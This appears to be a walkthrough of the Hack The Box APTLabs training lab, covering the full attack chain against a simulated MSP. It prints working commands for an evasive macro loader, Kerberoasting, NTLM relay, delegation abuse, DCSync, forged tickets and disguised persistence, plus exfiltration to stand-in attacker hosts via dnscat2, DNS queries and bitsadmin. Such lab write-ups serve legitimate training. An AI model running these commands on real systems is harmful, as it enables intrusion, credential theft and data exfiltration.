      Lab Overview & Scenario

      HTB APTLabs is the most demanding Pro Lab on the Hack The Box platform, rated Red Team Operator Level 3 and marketed as the “Ultimate Red Team Challenge.” The scenario places you in the shoes of an external threat actor executing a targeted attack against a Managed Service Provider (MSP) — a realistic threat model that mirrors real-world APT campaigns where compromising an MSP grants cascading access to all of its downstream client organizations.

      The lab consists of 18 machines spread across multiple network segments with a simulated WAN boundary between the attacker and the target infrastructure. There are 20 flags distributed across those hosts, and while HTB only provides the flag names as hints, following the intended path yields flags in the correct order. The entire environment runs on fully patched servers with modern enterprise security controls in place — no CVE exploitation is required or expected. Every technique covered here is a configuration or design flaw.

      Warning — Skill Prerequisites

      APTLabs is not an entry-level lab. Reviewers who completed it first recommend finishing Offshore, RastaLabs, and Cybernetics (or equivalent like OSEP, CRTO, CRTP) before attempting APTLabs. Expect to spend one to two months. The Discord #prolabs-aptlabs channel is largely quiet — you will need to be self-sufficient.

      Lab Specifics & Daily Reset

      The lab resets completely once every 24 hours, which sounds harsh but is manageable in practice. The strategy is to dump all relevant credential material at each stage and store it externally. A well-maintained notes file with hashes, TGTs, and access paths means you can restore your progress to the deepest compromised point in roughly 30–45 minutes by replaying credential reuse rather than re-executing every attack step.

      Infrastructure & C2 Setup

      Choosing a C2 Framework

      A Command and Control framework is not optional in APTLabs — it is a structural requirement. The lab involves pivoting through multiple network segments and maintaining implants on several machines simultaneously. Trying to do this with raw reverse shells and SSH tunnels will cause you to lose track of your access after every reset. The Cobalt Strike SOCKS proxy feature is particularly valuable for routing tooling through a compromised host into otherwise unreachable network segments.

      FrameworkVerdictNotes
      Cobalt StrikeHighly recommendedSOCKS proxy is a lifesaver. OPSEC-mature, stable.
      MythicRecommendedModern, extensible. Apollo or Poseidon agents work well.
      CovenantViableGood for earlier pro labs; limited SOCKS proxy support.
      SliverViableMatures quickly; WireGuard pivot is solid.

      Listener & Beacon Configuration

      Configure an HTTPS listener using a domain-fronted or CDN-proxied endpoint. Raw-IP HTTPS listeners will eventually be flagged by network monitoring. Cobalt Strike's malleable C2 profiles and Mythic's built-in profile system both allow you to disguise beacon traffic as legitimate services (OneDrive API calls, Teams presence pings, Azure health checks, etc.).

      Beacon sleep intervals should be randomized with jitter. A deterministic 5-second beacon is trivially detectable; a 30–90 second interval with 30% jitter mimics legitimate application telemetry. During the initial exploitation phase use short intervals for speed, then dial back once you have stable access.

      bash# Cobalt Strike — teamserver setup
      # Spin up teamserver on your VPS (Ubuntu 22.04)
./teamserver   /opt/profiles/amazon.profile

# In Cobalt Strike client: Listeners > Add
# Type: HTTPS
# Port: 443
# Hosts: your-cdn-fronted-domain.com
# Profile: amazon.profile (or similar benign-looking profile)

# Generate stageless beacon (stageless = safer, avoids staged-download detections)
# Attacks > Packages > Windows Executable (S) > x64 > Raw
      Info — Stageless vs. Staged Payloads

      Staged payloads download the full shellcode in a second network round-trip, which creates a second detection opportunity and leaves the full beacon shellcode traversing the wire. Stageless payloads embed everything in the initial binary. In a monitored environment like APTLabs, stageless is strongly preferred. The larger file size is an acceptable trade-off.

      Phase 1 — Initial Access

      T1566.001T1059.005T1027

      Phishing Campaign

      The initial access vector is a spear-phishing email delivering a weaponized Office document. The lure theme targets MSP staff with a plausible business-context document (invoice, client report, or SLA agreement). The document carries an obfuscated VBA macro that executes on open (or, if macro execution requires a click, on EnableContent).

      The macro is responsible for two jobs: decoding and executing an in-memory shellcode loader, and suppressing any visible error or warning to the victim. Donut is used to convert a .NET or EXE payload into position-independent shellcode that runs entirely in memory, leaving no binary on disk.

      bash# Generate shellcode with Donut
      # Convert a .NET beacon loader to PIC shellcode
donut -i beacon_loader.exe -a 2 -f 1 -o shellcode.bin

# Donut flags:
# -a 2  : target x64
# -f 1  : output as raw binary
# -o    : output file

# Optionally XOR-encrypt the shellcode to avoid static sig detection
python3 xor_encrypt.py shellcode.bin 0x41 shellcode_xored.bin

      VBA Stager & AV Bypass

      The VBA macro is written to avoid triggering static analysis heuristics. Key obfuscation techniques layered in the macro include: string splitting across multiple variables to defeat pattern matching, dynamic API resolution via CallByName and Environ() tricks to avoid direct WinAPI imports, and base64+XOR encoding of the shellcode blob embedded as a string constant.

      bash# Macro obfuscation techniques (conceptual)
      # The VBA macro structure (pseudocode outline):
# 1. Concatenate split strings to form API names at runtime
#    (avoids "VirtualAlloc", "CreateThread" appearing in plaintext)
# 2. Decode XOR-obfuscated shellcode blob from string constant
# 3. Allocate RWX memory via VirtualAlloc (resolved dynamically)
# 4. Copy shellcode into allocated region
# 5. CreateThread on shellcode base address
# 6. Document_Open event triggers execution silently

# Test against Defender before delivery:
# Run AmsiScanBuffer patch first if testing locally, or use an
# isolated VM with Defender enabled and check no alert triggers
      Danger — AMSI & Defender

      Modern Windows Defender and AMSI will flag well-known shellcode patterns even in-memory. If your initial beacon is dying immediately after execution, the shellcode itself is likely being scanned. Rotate the XOR key, apply sleep masking to the beacon, or use a custom loader that patches AmsiScanBuffer before running the shellcode. AMSI patching within the VBA macro is a common first step.

      Foothold Result

      A successful phishing delivery yields a Cobalt Strike (or Mythic) beacon running as the domain-joined workstation user. At this point you have:

      • Code execution as a low-privileged domain user on a workstation (e.g., CORP\jsmith)
      • An active C2 beacon phoning home over HTTPS with jitter
      • Access to the internal network from the perspective of a domain member

      Do not escalate privileges immediately. Enumerate first. Rushing to SYSTEM before mapping the domain wastes the stealthiest phase of your access.

      Phase 2 — Internal Recon & Enumeration

      T1087T1069T1482

      BloodHound Domain Mapping

      BloodHound is the single most important tool in this lab. Run it before doing anything else inside the domain. The SharpHound collector gathers all the object relationships, ACL entries, session data, and group memberships that BloodHound needs to draw the attack graph. Run it from your beacon using an in-memory execution to avoid dropping a binary on disk.

      bash# In-memory SharpHound via Cobalt Strike execute-assembly
      # Execute SharpHound in memory (no disk drop)
execute-assembly /opt/tools/SharpHound.exe -c All --zipfilename bh_output.zip

# Exfil the zip back through the C2 channel
download bh_output.zip

# On your attack machine, load into BloodHound
# neo4j start
# Open BloodHound, upload bh_output.zip

# Critical queries to run in BloodHound:
# 1. "Find all Domain Admins"
# 2. "Shortest Path to Domain Admins"
# 3. "Find Principals with DCSync Rights"
# 4. "Find Computers where Domain Users are Local Admin"
# 5. "Find AS-REP Roastable Users"
# 6. "Find Kerberoastable Users with High-Value Targets"

      PowerView Enumeration

      BloodHound provides the graph; PowerView provides the deep-dive enumeration on specific objects. Key targets at this phase: service accounts with SPNs (Kerberoasting targets), accounts with DONT_REQUIRE_PREAUTH set (AS-REP roasting), hosts with unconstrained delegation, and any ACL misconfigurations where your current user or a reachable group has unexpected write/own rights over high-value objects.

      bash# PowerView — key enumeration commands
      # Load PowerView in memory via beacon
powershell-import /opt/tools/PowerView.ps1

# Find Kerberoastable accounts (have SPNs, not krbtgt)
powershell Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Find accounts with AS-REP roasting enabled
powershell Get-DomainUser -PreauthNotRequired | select samaccountname

# Enumerate domain trusts
powershell Get-DomainTrust

# Find hosts with unconstrained delegation
powershell Get-DomainComputer -Unconstrained | select name,dnshostname

# Find ACL misconfigs on current user / groups
powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "jsmith"}

# Enumerate local admins across the domain (noisy, use carefully)
powershell Find-LocalAdminAccess
      Hint — DNS Record Manipulation

      Relay attacks (SMB relay, LDAP relay) require that victims send their NTLM authentication to your controlled listener rather than the real server. In a modern network without LLMNR/NBT-NS broadcasting, this often means you need to manipulate DNS records to point hostnames at your relay listener. Standard domain users can often create DNS records in the domain DNS zone using tools like dnstool.py from the Krbrelayx toolkit. This is one of the most important techniques in APTLabs.

      Phase 3 — Privilege Escalation

      T1558.003T1134T1558.004

      Kerberoasting

      Kerberoasting requests a TGS (service ticket) for any account with a registered SPN. The TGS is encrypted with the service account’s NTLM hash and can be taken offline for cracking. The key distinction between a successful and unsuccessful Kerberoast is the password cracking phase — the Rockyou wordlist alone is frequently insufficient in APTLabs. Combine it with rule-based mutation, especially the NotSoSecure Hashcat rules, which apply real-world corporate password patterns.

      bash# Kerberoasting with Rubeus
      # Request TGS for all Kerberoastable accounts (from beacon)
execute-assembly /opt/tools/Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt

# Crack with Hashcat (rc4 = $krb5tgs$23$; aes256 = $krb5tgs$18$)
# Start with best64 rules + rockyou
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule

# If that fails, apply NotSoSecure corporate rules
git clone https://github.com/NotSoSecure/password_cracking_rules
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
        -r password_cracking_rules/OneRuleToRuleThemAll.rule

# Try common corporate patterns as a custom wordlist too:
# Company2023!, Company@123, Season+Year combos
hashcat -m 13100 kerberoast_hashes.txt corporate_wordlist.txt --force

      Token Impersonation via SeImpersonatePrivilege

      Service accounts running IIS, MSSQL, or similar Windows services frequently have the SeImpersonatePrivilege token assigned. If you land on a host as such a service account, you can impersonate the SYSTEM token using a local privilege escalation technique. Modern variants (PrintSpoofer, GodPotato, SweetPotato) work on fully patched Windows Server 2019 and 2022 and do not require a specific CVE.

      bash# Token impersonation — PrintSpoofer / GodPotato
      # Check current token privileges
execute-assembly /opt/tools/Seatbelt.exe TokenPrivileges

# If SeImpersonatePrivilege is present:
# Option A — PrintSpoofer (triggers spooler pipe impersonation)
execute-assembly /opt/tools/PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe /c whoami"

# Option B — GodPotato (works on Server 2022, Win 11)
execute-assembly /opt/tools/GodPotato.exe -cmd "cmd /c whoami"

# Option C — SweetPotato (StorSvc CLSID impersonation)
execute-assembly /opt/tools/SweetPotato.exe -a "cmd.exe /c whoami"

# Once SYSTEM, inject a new beacon into a SYSTEM process
# (or migrate into lsass / winlogon for persistence)
inject  x64

      Phase 4 — Lateral Movement

      T1550.002T1557.001T1558

      SMB Relay & NTLM Capture

      NTLM relay is one of the core techniques in APTLabs. The setup requires two components: a listener that forces authentication (by responding to or poisoning DNS/NetBIOS lookups pointing victims at your host) and a relay server that forwards captured authentication to a target service. The target of the relay should be a host where the victim account is a local admin and where SMB signing is not enforced.

      bash# SMB relay chain setup
      # Step 1: Identify hosts without SMB signing
nxc smb 10.10.10.0/24 --gen-relay-list targets_no_signing.txt

# Step 2: Create a rogue DNS entry to redirect victim traffic to us
# (requires domain user account with DNS write rights)
python3 dnstool.py -u CORP\\jsmith -p 'Password123!' \
        --action add --record WPAD --data 10.10.10.200 10.10.10.1

# Step 3: Run ntlmrelayx targeting the no-signing host
impacket-ntlmrelayx -tf targets_no_signing.txt -smb2support \
        -socks -of ntlm_hashes.txt

# Step 4: Optionally relay directly to LDAP to perform RBCD setup
impacket-ntlmrelayx -t ldap://DC01.corp.local -smb2support \
        --delegate-access --escalate-user jsmith$

# Once socks proxy is running via ntlmrelayx:
# Add to proxychains config and route Impacket tools through it

      Over-Pass-the-Hash

      Pass-the-hash directly often fails against modern targets with Protected Users groups or Credential Guard enabled. The alternative is Over-Pass-the-Hash (OPtH): use an NTLM hash to request a full Kerberos TGT for the target account, then use that TGT for all subsequent authentication. This bypasses NTLM-based restrictions because the resulting authentication is Kerberos, which is generally unrestricted.

      bash# Over-Pass-the-Hash with Rubeus
      # OPtH: Use NTLM hash to get Kerberos TGT for target account
execute-assembly /opt/tools/Rubeus.exe asktgt /user:svc_backup \
        /rc4:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b \
        /domain:corp.local /dc:DC01.corp.local /ptt

# Verify TGT was injected into current session
execute-assembly /opt/tools/Rubeus.exe tklist

# Now use the TGT to WinRM / PSExec into the target
# (Kerberos auth will succeed even if NTLM is blocked)
powershell Enter-PSSession -ComputerName SRV02.corp.local -Authentication Kerberos

      Resource-Based Constrained Delegation (RBCD) Abuse

      RBCD abuse is the technique most central to the intended path in APTLabs. The attack requires two preconditions: an account whose msDS-AllowedToActOnBehalfOfOtherIdentity attribute you can write to (the target), and a controlled principal with a Service Principal Name (an existing service account or a machine account you create). The attack flow is:

      1. Identify a target resource (e.g., a DC or server) whose RBCD attribute you can modify via an ACL misconfiguration.
      2. Create or identify a controlled account with an SPN (machine accounts are ideal since you can create them if MachineAccountQuota > 0).
      3. Write your controlled account's SID into the target’s msDS-AllowedToActOnBehalfOfOtherIdentity.
      4. Use S4U2Self + S4U2Proxy to get a service ticket to the target resource impersonating any user (e.g., Domain Admin).
      bash# RBCD Attack — Full Chain
      # Step 1: Create a rogue machine account (if MachineAccountQuota allows)
impacket-addcomputer corp.local/jsmith:'Password123!' \
        -computer-name 'ROGUE$' -computer-pass 'Rogue@123!'

# Step 2: Write RBCD — set ROGUE$ as allowed to delegate to DC01$
impacket-rbcd corp.local/jsmith:'Password123!' \
        -action write -delegate-from 'ROGUE$' \
        -delegate-to 'DC01$' -dc-ip 10.10.10.1

# Verify the attribute was written
impacket-rbcd corp.local/jsmith:'Password123!' \
        -action read -delegate-to 'DC01$' -dc-ip 10.10.10.1

# Step 3: Get S4U ticket — impersonate Administrator on DC01
impacket-getST corp.local/'ROGUE$':'Rogue@123!' \
        -spn cifs/DC01.corp.local -impersonate Administrator \
        -dc-ip 10.10.10.1

# Step 4: Use the TGT (Administrator@cifs_DC01.ccache)
export KRB5CCNAME=Administrator@cifs_DC01.corp.local.ccache
impacket-psexec -k -no-pass DC01.corp.local

# Verify you have SYSTEM on DC01
whoami
# nt authority\system
      Info — When MachineAccountQuota is 0

      If the domain has ms-DS-MachineAccountQuota set to 0, you cannot create new computer accounts as a regular user. The workaround is to find an existing account whose SPN you can modify (e.g., via GenericWrite on a service account), add an SPN to that account, and use it as the delegation source in place of a newly created machine account.

      Phase 5 — Domain Domination

      T1003.006T1558.001

      DCSync Attack

      DCSync abuses the Directory Replication Service (DRS) protocol. An account with the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights (held by Domain Admins and Domain Controllers by default, but often granted to other principals via over-permissive ACLs) can simulate being a domain controller and “pull” any user’s credentials from the real DC.

      bash# DCSync — dump all domain hashes
      # Option A: impacket-secretsdump (from Linux, Kerberos auth)
export KRB5CCNAME=Administrator@cifs_DC01.corp.local.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc-ntlm

# Option B: mimikatz via beacon (in-memory, from SYSTEM beacon on DC)
execute-assembly /opt/tools/mimikatz.exe \
        "lsadump::dcsync /domain:corp.local /all /csv" "exit"

# Option C: lsassy (LSASS dump via built-in Windows features)
execute-assembly /opt/tools/lsassy.exe -u Administrator \
        -H aad3b435b51404eeaad3b435b51404ee: DC01.corp.local

# Key hashes to save from DCSync output:
# - krbtgt   : needed for Golden Ticket
# - Administrator : obvious
# - All service accounts : reuse across domain
# - Computer accounts    : needed for inter-forest attacks

      Golden Ticket Forgery

      With the krbtgt hash in hand, you can forge Kerberos TGTs (Ticket Granting Tickets) for any user in the domain, valid for any service. Golden tickets are valid for 10 years by default and bypass most account lockout and password-change controls because the krbtgt hash rarely rotates. This is the apex of single-domain compromise.

      bash# Golden Ticket — Rubeus forge
      # Get domain SID first
execute-assembly /opt/tools/PowerView.ps1
powershell Get-DomainSID
# S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# Forge Golden Ticket with Rubeus
execute-assembly /opt/tools/Rubeus.exe golden \
        /rc4: \
        /domain:corp.local \
        /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
        /user:Administrator \
        /ptt

# Alternatively with mimikatz
execute-assembly /opt/tools/mimikatz.exe \
        "kerberos::golden /domain:corp.local /user:BackdoorAdmin \
        /sid:S-1-5-21-XXX-XXX-XXX /rc4: /ptt" "exit"

# Verify ticket is loaded
execute-assembly /opt/tools/Rubeus.exe tklist

      Phase 6 — Multi-Domain & Forest Escalation

      T1482T1134.005

      Enumerating Trust Relationships

      APTLabs involves multiple domains and at least one cross-forest trust boundary. Domain trusts are the bridges between these kingdoms. Once a domain is fully compromised, enumerate all trusts it participates in and determine their direction and transitivity.

      bash# Trust enumeration
      # Enumerate all trusts from current domain
powershell Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType,TrustAttributes

# Check for forest trusts specifically
powershell Get-ForestTrust

# Map all domains in the forest
powershell Get-ForestDomain | select Name,DomainControllers

# Enumerate cross-forest users (if trust allows)
powershell Get-DomainUser -Domain partner.forest -Server DC01.partner.forest

      Child Domain to Parent Forest Escalation

      If the lab environment includes a child domain structure (child.corp.local under corp.local), the child-to-parent escalation via SID history injection is a core technique. A domain admin in the child domain can forge a TGT that includes the SID of the parent domain's Enterprise Admins group in its SID history field, granting full control over the parent domain.

      bash# Child to Parent via SID History — Mimikatz
      # Required:  krbtgt hash of CHILD domain
#            SID of PARENT domain Enterprise Admins group

# Get child domain krbtgt hash (already done from child DCSync)
# Get Enterprise Admins SID from parent domain
impacket-lookupsid corp.local/Administrator:@DC01.corp.local | grep "Enterprise Admins"
# Enterprise Admins SID: S-1-5-21-PARENT-XXX-XXX-XXX-519

# Forge inter-realm Golden Ticket with extra SID (Enterprise Admins)
execute-assembly /opt/tools/Rubeus.exe golden \
        /rc4: \
        /domain:child.corp.local \
        /sid:S-1-5-21-CHILD-DOMAIN-SID \
        /sids:S-1-5-21-PARENT-DOMAIN-SID-519 \
        /user:Administrator \
        /target:corp.local \
        /ptt

# Use the forged ticket to access parent DC
ls \\DC01.corp.local\C$
impacket-psexec -k -no-pass DC01.corp.local

      Cross-Forest Kerberoasting & Trust Ticket Abuse

      Bidirectional forest trusts (or even unidirectional external trusts where the trusted forest accounts can authenticate to the trusting forest) open up cross-forest Kerberoasting. Accounts from the trusted forest that have SPNs registered in the trusting forest can be Kerberoasted from the trusting forest’s perspective, yielding hashes for accounts in the partner forest.

      bash# Cross-forest Kerberoasting
      # From inside corp.local, Kerberoast accounts in partner.forest
impacket-GetUserSPNs corp.local/Administrator -target-domain partner.forest \
        -dc-ip DC01.partner.forest -hashes :<NTHASH> -request

# Crack the cross-forest TGS hashes
hashcat -m 13100 crossforest_hashes.txt /usr/share/wordlists/rockyou.txt \
        -r password_cracking_rules/OneRuleToRuleThemAll.rule

# Alternative: request inter-realm TGT for partner forest
# Get the inter-realm trust key (found in LSA secrets on DC)
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc | grep "partner.forest"

# Forge inter-forest trust ticket
execute-assembly /opt/tools/Rubeus.exe silver \
        /rc4:<TRUST_KEY> \
        /domain:corp.local \
        /sid:S-1-5-21-CORP-SID \
        /user:Administrator \
        /target:partner.forest \
        /service:krbtgt \
        /sids:S-1-5-21-PARTNER-ENTERPRISE-ADMINS-SID \
        /ptt
      Warning — SID Filtering

      Cross-forest trusts have SID filtering enabled by default, which blocks SID history injection across the forest boundary. The child-to-parent SID history technique works within a forest (intra-forest trusts have filtering disabled by default). For cross-forest escalation, you need either a misconfigured trust with SIDFilteringForestAware = False, or you need to compromise accounts native to the target forest and pivot from there using traditional lateral movement.

      Phase 7 — Persistence

      T1546.003T1053.005T1574.001

      WMI Event Subscriptions

      WMI event subscriptions are the gold standard for fileless, high-privilege persistence. A subscription consists of an EventFilter (trigger condition: e.g., on system startup, or on every N minutes), an EventConsumer (action: CommandLineEventConsumer runs a command, ActiveScriptEventConsumer runs a VBScript), and a FilterToConsumerBinding linking the two. Properly written WMI subscriptions survive reboots, are invisible to standard process listings, and are rarely checked by blue teams who are focused on file-based persistence.

      bash# WMI Event Subscription — PowerShell
      # WMI Persistence — triggers every system startup, runs beacon loader
# Delivered via PowerShell from SYSTEM beacon

powershell @"
`$Filter = Set-WmiInstance -Class '__EventFilter' -Namespace 'root\subscription' -Arguments @{
    Name = 'WindowsUpdateCheck'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

`$Consumer = Set-WmiInstance -Class 'CommandLineEventConsumer' -Namespace 'root\subscription' -Arguments @{
    Name = 'WindowsUpdateConsumer'
    CommandLineTemplate = 'powershell.exe -nop -w hidden -enc <BASE64_STAGER>'
}

Set-WmiInstance -Class '__FilterToConsumerBinding' -Namespace 'root\subscription' -Arguments @{
    Filter = `$Filter
    Consumer = `$Consumer
}
"@

      Scheduled Tasks

      Scheduled tasks are noisier than WMI subscriptions but easier to troubleshoot and more reliable across different Windows versions. Use a name that blends into the existing task scheduler entries (e.g., MicrosoftEdgeUpdateTaskMachineCore, WindowsDefenderScheduledScan). Store the payload in a path that appears legitimate.

      bash# Scheduled task persistence
      # Create a disguised scheduled task running on logon as SYSTEM
schtasks /create /tn "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_Display" \
         /tr "powershell.exe -nop -w hidden -enc <BASE64>" \
         /sc ONLOGON /ru SYSTEM /f

# Verify creation
schtasks /query /tn "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_Display"

# For lateral persistence on remote host (if admin access):
impacket-atexec corp.local/Administrator:<HASH>@TARGET_HOST \
        "powershell -nop -w hidden -enc <BASE64>"

      Registry Hijacking & DLL Sideloading

      Registry-based persistence (Run keys, Image File Execution Options, AppInit_DLLs) is well-known but still effective when combined with a living-off-the-land binary. The technique is to point a Run key at a legitimate LOLBin (mshta.exe, regsvr32.exe, certutil.exe) with arguments that pull and execute the payload. DLL sideloading places a malicious DLL in a path that a legitimate application searches before its intended DLL location — it executes when the legitimate application starts.

      bash# Registry Run key persistence (HKCU — no admin needed)
      # HKCU Run key (persists for current user, no admin required)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
        /v "OneDriveStandaloneUpdater" \
        /t REG_SZ \
        /d "powershell.exe -nop -w hidden -enc <BASE64>" /f

# HKLM Run key (requires admin, persists for all users)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
        /v "AdobeUpdateService" \
        /t REG_SZ \
        /d "C:\ProgramData\Adobe\updater.exe" /f

# Image File Execution Options (debugger hijack — triggers on any process start)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" \
        /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe /c calc.exe" /f

      Data Staging with LOLBins

      Staging simulates the real-world APT behavior of collecting and compressing sensitive data before exfiltration. APTLabs rewards this as a demonstration that you understand the full adversary workflow beyond just capturing flags. Native tools (certutil, bitsadmin, compress) avoid introducing new binaries and blend into normal administrative activity.

      bash# Data staging with native Windows tools
      # Compress a directory of interesting files (7zip via cmd or native compress)
powershell Compress-Archive -Path C:\Users -DestinationPath C:\Windows\Temp\sys_backup.zip

# Encode to base64 for exfil (certutil — native Windows utility)
certutil -encode C:\Windows\Temp\sys_backup.zip C:\Windows\Temp\sys_b64.txt

# Alternative staging: use xcopy to a UNC path (your relay / C2 server)
xcopy /s /e C:\Sensitive \\ATTACKER_HOST\share\

# Check file for ADS (Alternate Data Streams) — can hide staged data
type secret.txt > legitimate_doc.docx:hidden_stream
more < legitimate_doc.docx:hidden_stream

      Exfiltration Channels

      DNS tunneling is the most covert exfiltration channel in monitored environments because DNS queries rarely trigger alerts and most firewalls permit outbound DNS. HTTPS exfil via the C2 channel is simpler and faster but more visible if traffic inspection is in place. In APTLabs, exfiltration via the existing C2 HTTPS channel is usually sufficient since there is no active blue team monitoring.

      bash# DNS tunneling exfil (iodine / dnscat2)
      # On attacker C2 server: run dnscat2 server
ruby dnscat2.rb --dns port=53,domain=exfil.attacker.com --secret=mysecret

# On victim machine: run dnscat2 client (executable or PowerShell version)
.\dnscat2.exe --secret=mysecret exfil.attacker.com

# Alternatively: encode data in DNS TXT record queries (manual)
# Each query exfils 63 bytes (max label length)
powershell $data = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\secret.txt"))
powershell $chunks = $data -split "(.{60})" | Where-Object {$_}
powershell foreach($chunk in $chunks){ Resolve-DnsName "$chunk.exfil.attacker.com" -Type TXT }

# HTTPS exfil via BITS (Background Intelligent Transfer Service — LOLBin)
bitsadmin /transfer "WindowsUpdate" /upload https://attacker.com/upload C:\Windows\Temp\staged.zip

      Key Tips & Lessons Learned

      Credential Management After Each Reset

      Build a persistent notes file (Obsidian, Notion, or a local markdown) that stores every recovered credential, hash, TGT, and access path in a structured format. After each daily reset, you will replay access using stored material rather than re-running attacks from scratch. Organize by network segment and machine name. Include the exact Impacket or Rubeus commands needed to re-authenticate, so recovery is a matter of copy-paste.

      DNS Manipulation is Central to Relay Attacks

      Modern corporate networks have LLMNR and NBT-NS disabled, which kills traditional Responder-style poisoning. APTLabs requires you to understand how to create and modify DNS records as an authenticated domain user to redirect traffic. The Krbrelayx toolkit’s dnstool.py script is essential. Study how to add, modify, and clean up DNS records to avoid leaving obvious forensic artifacts.

      Password Cracking Beyond Rockyou

      The Rockyou wordlist was compiled from a 2009 breach and reflects consumer password habits. Corporate environments use different patterns: company name + year + special character, seasonal passwords (Winter2023!), department-specific patterns. The NotSoSecure OneRuleToRuleThemAll Hashcat ruleset applies thousands of corporate-style mutations to a base wordlist and dramatically improves hit rate on Kerberoast and NTLM hashes.

      Operational Security in a Monitored Environment

      Although APTLabs has no active blue team, the security controls (AV, EDR hooks, PowerShell logging) are real and will kill carelessly delivered payloads. Key OPSEC principles that make or break progress here: always prefer in-memory execution (execute-assembly) over disk drops; use obfuscated PowerShell (encoding, variable substitution) rather than raw commands; clean up created artefacts (scheduled tasks, DNS entries, WMI subscriptions) after your access path changes; and keep beacon sleep intervals high except when actively doing work.

      Summary — Why APTLabs Is Worth It

      The techniques in APTLabs — RBCD, relay chains with DNS manipulation, cross-forest trust escalation, OPSEC-conscious payload delivery — are the exact same techniques showing up in real-world breach reports from groups like Scattered Spider, ALPHV affiliates, and nation-state actors. No CVE-of-the-month will teach you to chain misconfigured ACLs into a Golden Ticket and pivot across a forest boundary. APTLabs will. The two-month grind is a bargain for what you internalize.
